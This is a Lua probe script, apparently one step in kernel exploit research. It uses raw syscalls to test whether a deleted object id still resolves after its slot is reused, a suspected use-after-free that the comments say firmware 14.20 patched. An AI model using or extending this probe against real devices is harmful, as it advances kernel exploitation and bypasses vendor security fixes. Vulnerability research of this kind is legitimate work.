-- CRASH_CLASS: RISKY
-- PROBE 496a: does a deleted id still resolve after its slot is reused?
-- The 14.20 fix is described as a generation-ID check, not a wider lock, which
-- means the 14.10 lookup accepts a slot that has been freed and handed to a new
-- object. 489c showed a plain second delete returns 0x80020003, so the entry is
-- removed; the question is what happens once create() reuses the same slot and
-- the old id is used again.
print("=== PROBE 496a: id reuse after delete ===")
io.stdout:setvbuf("no")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local data = memory.alloc(0x2000)
local out  = memory.alloc(0x100)
local ids  = memory.alloc(0x100)
local res  = memory.alloc(0x400)
local sc669, sc664, sc662 = make_syscall(669), make_syscall(664), make_syscall(662)
for off = 0, 0x2000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
local function create()
  for off = 0, 0x100 - 1, 4 do pcall(function() memory.write_dword(out + off, 0) end) end
  local ok = pcall(function() return sc669(uint64(1), uint64(data), uint64(1), uint64(1), uint64(out)) end)
  if not ok then return nil, -999 end
  return to_num(memory.read_dword(out))
end
local function call662(id)
  pcall(function() memory.write_dword(ids, id) end)
  for off = 0, 0x40 - 1, 4 do pcall(function() memory.write_dword(res + off, 0x77777777) end) end
  local ok, rv = pcall(function() return sc662(uint64(ids), uint64(1), uint64(res)) end)
  return (ok and to_num(rv) or -999), to_num(memory.read_dword(res))
end
local function poll(id)
  pcall(function() memory.write_dword(ids, id) end)
  local ok, rv = pcall(function() return sc664(uint64(ids), uint64(1), uint64(res)) end)
  return (ok and to_num(rv) or -999), to_num(memory.read_dword(res))
end

print("[A] eight creates, raw ids")
for i = 1, 8 do
  local id = create()
  print(string.format("    create %d -> %s (%#x)", i, tostring(id), to_num(id)))
end

print("[B] create, poll, delete, create again")
local a = create()
local pr, ps = poll(a)
print(string.format("    a=%s poll_ret=%d status=%#x", tostring(a), pr, ps))
local dr, ds = call662(a)
print(string.format("    delete a: ret=%d status=%#x", dr, ds))
local b = create()
print(string.format("    b=%s", tostring(b)))
local dr2, ds2 = call662(a)
print(string.format("    delete a again: ret=%d status=%#x", dr2, ds2))
local dr3, ds3 = call662(b)
print(string.format("    delete b: ret=%d status=%#x", dr3, ds3))
print("=== PROBE 496a COMPLETE ===")
